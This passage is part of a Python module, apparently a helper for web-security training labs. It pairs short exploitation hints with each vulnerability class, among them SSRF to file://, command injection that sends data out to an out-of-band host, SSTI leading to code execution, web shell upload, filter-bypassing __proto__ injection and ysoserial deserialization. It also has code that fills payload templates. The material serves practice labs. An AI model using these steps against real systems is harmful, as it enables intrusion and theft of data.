    "client-side-proto-pollution": "Load the URL with ?__proto__[gadget]=payload in the browser; if filtered, use the nested __pro__proto__to__ form.",
    "ssrf": "Point the parameter at Collaborator to confirm, then at localhost / file:// to read the secret.",
    "os-command-injection": "Paste the exploit payload into the parameter, then check Collaborator for the stolen data.",
    "xxe": "Send the XXE body in Repeater; if nothing reflects, use the out-of-band DTD version.",
    "path-traversal": "Put the ../ path in the parameter to read /home/carlos/secret.",
    "ssti": "Confirm with {{7*7}} → 49, then fire the RCE payload to read the secret.",
    "file-upload-rce": "Upload the web shell (try the bypasses), then open it in the browser.",
    "deserialization": "Decode the serialized cookie, tamper the fields (or use ysoserial/phpggc for RCE), re-encode and resend.",
    "server-side-proto-pollution": "Add \"__proto__\":{\"isAdmin\":true} (or a spawn-option gadget for RCE) to the JSON body and resend.",
}


def what_is(cls: str) -> str:
    return WHATIS.get(cls, "A possible security issue to investigate.")


def next_step(cls: str) -> str:
    return NEXTSTEP.get(cls, "Open the card below and follow the Detect/Play hints.")


def render(cls: str, ph: dict[str, str]) -> list[Payload]:
    out = []
    for name, tmpl, kind in _BANK.get(cls, []):
        out.append(Payload(name=name, body=_sub(tmpl, ph), kind=kind))
    return out


def _sub(tmpl: str, ph: dict[str, str]) -> str:
    # Two-pass so substring collisions can't happen: COLLAB contains "LAB",
    # EXPLOIT does not contain the others but we treat all three uniformly.
    # Pass 1: every token -> a collision-free sentinel. Pass 2: sentinel -> value.
    sentinels = {"EXPLOIT": "\x00E\x00", "COLLAB": "\x00C\x00", "LAB": "\x00L\x00"}
    s = tmpl
    for k in ("EXPLOIT", "COLLAB", "LAB"):      # longest first still matters for pass 1
        s = s.replace(k, sentinels[k])
    for k in ("EXPLOIT", "COLLAB", "LAB"):
        v = ph.get(k) or f"<{k.lower()}>"       # lowercase fallback won't re-match a token
        s = s.replace(sentinels[k], v)
    return s


def lab_links(cls: str) -> list[str]:
    return LABS.get(cls, [])


def hint(cls: str, which: str) -> str:
    return HINTS.get(cls, {}).get(which, "")
